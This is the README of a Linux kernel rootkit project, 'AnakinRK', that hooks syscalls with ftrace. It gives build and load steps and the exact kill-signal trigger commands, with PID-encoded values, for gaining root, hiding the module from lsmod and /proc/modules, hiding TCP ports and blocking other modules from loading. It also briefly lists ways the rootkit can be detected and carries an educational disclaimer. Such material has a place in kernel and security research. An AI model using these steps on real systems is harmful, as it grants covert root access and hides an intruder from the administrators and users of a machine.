# AnakinRK – A Linux Kernel Rootkit using ftrace

AnakinRK is a lightweight Linux kernel module that demonstrates rootkit techniques by hooking system calls via **ftrace**. It provides privilege escalation, self‑hiding capabilities, and the ability to block the loading of other kernel modules. The project is intended strictly for educational and research purposes.

## Features

* **Root Privilege Escalation**
  Privileges are granted using a signal‑based command system hooked through `sys_kill`.

* **Module Visibility Toggle**
  The module can hide or unhide itself from `/proc/modules` and `lsmod`.

* **TCP Ports Hiding**
  The module can hide or unhide any TCP port

* **Kernel Module Loading Prevention**
  Hooks `init_module` and `finit_module` so that module insertion appears to succeed but no module is actually loaded.

* **Command‑based Control Interface**
  Instead of a fixed PID, commands are encoded directly in the **PID value** and triggered using a single magic signal.

* **ftrace‑based Hooking**
  Uses ftrace instead of modifying the syscall table or using `/dev/mem`.

---

## Files

```
.
├── assets/                         # Assets for github
├── build/                          # Compiled anakin.ko
├── .build-artifacts/               # Intermediate object files
├── Makefile
├── README.md
└── src
    ├── ftrace/                     # ftrace helper by xcellerator (MatheuZSecurity's fork)
    ├── hooks/                      # Syscalls and internals hooks
    ├── include/                    # Include linux kernel headers
    ├── include_hooks/              # Definitions for hooks
    ├── include_modules             # Definitions for modules
    ├── main.c                      # Main file and orchestrator
    ├── Makefile                    # Internal Makefile (haven't targets)
    └── modules                     # Modules implementations

```

---

## Building

Make sure kernel headers for the running kernel are installed.

```bash
make build
```

The module will be generated at:

```
build/anakin.ko
```

---

## Loading / Unloading

### Load

```bash
sudo insmod build/anakin.ko
```

### Unload

```bash
sudo rmmod anakin
```

When loaded:

```
Anakin is here
```

When unloaded:

```
Anakin killed padmé
```

---

## Usage

The rootkit hooks `sys_kill` and listens for a **magic signal **.
Commands are triggered by sending this signal with a specific **PID value**.

### How to use

Check help table with:

```bash
sudo dmesg -Wl debug
```

In other terminal (without closing the `dmesg` process) run:

```bash
kill -67 $(printf "%d" 0x$(printf "%4.s" "help" | xxd -p))
```

### rk-helper

The trigger is so long, you should want to use this helper:

```bash
rk-helper () {
	printf "%d" 0x$(printf "%.4s" "$1" | xxd -p)
}
```

---

## Commands

### 1. Get Root

```bash
kill -67 $(rk-helper root)
```

Grants root privileges (UID/GID = 0) to the calling process.

---

### 2. Hide / Unhide Module

```bash
kill -67 $(rk-helper hide)
```

Toggles visibility of the module from:

* `lsmod`
* `/proc/modules`

---

### 3. Toggle hidden ports

```bash
kill -69 <port>
```

---

### 4. Show Help Menu (Kernel Log)

```bash
kill -67 $(rk-helper help)
```

Prints a command table to `dmesg`.

---

## How It Works

The module installs hooks using ftrace:

When the signal is detected, the PID value is interpreted as a command:

| PID value (hex) | Command     |
| --------------- | ----------- |
| `0x726f6f74`    | Get root    |
| `0x68696465`    | Toggle hide |
| `0x68656c70`    | Help menu   |
| `Any until 65535` | Toggle hidden port |
---

## Kernel Compatibility

Tested on modern kernels using ftrace‑based syscall hooking.
If the module crashes on newer kernels, check:

```
USE_FENTRY_OFFSET
```

inside `ftrace_helper.h`.

---

## Limitations

* Only hides the module from the kernel module list
* Does not hide the `.ko` file from disk
* Can still be detected using:

  * ftrace hook inspection
  * kprobe scanners
  * memory integrity tools

---

## Disclaimer

This project is intended strictly for:

* kernel research
* reverse engineering studies
* defensive security learning

Do not use this on systems you do not own or have permission to test.

---

![You understimate my power!](./assets/its-over-anakin.gif)
